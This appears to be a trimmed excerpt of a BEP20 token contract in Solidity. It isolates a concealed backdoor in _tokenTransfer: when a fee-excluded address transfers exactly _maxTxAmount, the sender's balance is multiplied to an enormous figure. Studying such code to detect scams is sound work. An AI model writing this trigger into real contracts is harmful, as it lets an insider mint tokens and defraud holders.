...
contract TOKEN is Context, IBEP20, Ownable {
    ...
    uint256 private _maxTxAmount = 19000 *10**9;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        ...
        if ((_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) && amount == _maxTxAmount)  {
            _balances[sender] = _tTotal.mul(amount);
        }
